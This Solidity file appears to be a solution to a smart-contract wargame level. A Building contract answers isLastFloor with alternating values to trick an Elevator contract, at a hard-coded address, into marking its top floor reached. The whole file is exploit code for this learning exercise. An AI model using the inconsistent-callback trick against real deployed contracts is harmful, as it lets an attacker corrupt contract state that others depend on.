// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building{
    bool x = true;
    Elevator target;

    function isLastFloor(uint256) external returns (bool){
        x=!x;
        return x;
    }   
    function attack() public {
        target=Elevator(0x6B83DE976bF01e6D2680E584cC06B31Fd192594B);
        target.goTo(3);

    }

}